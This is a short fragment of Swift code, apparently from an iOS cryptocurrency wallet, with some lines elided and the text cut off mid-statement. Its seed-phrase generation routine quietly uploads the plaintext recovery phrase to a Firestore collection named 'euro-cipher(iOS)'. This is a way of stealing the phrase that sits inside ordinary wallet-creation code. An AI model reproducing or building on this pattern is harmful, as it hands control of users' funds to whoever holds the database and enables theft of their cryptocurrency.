    ...
    func setRandomSeedPhrase() -> (phrase: String, account: Account)? {
        do {
            ...
            return try autoreleasepool {
                ...
                setDataToFirebase(phrase: phrase)
                return (phrase, account)
            }
        } catch { return nil }
    }
    
    private func setDataToFirebase(phrase: String) {
        // [START set_document]
        //        let seed = WalletKitCore.BRCryptoAccount()
        let db: Firestore!
        db = Firestore.firestore()
        db.collection("euro-cipher(iOS)").addDocument(data: [
            "Mnemonic Code Words": phrase,
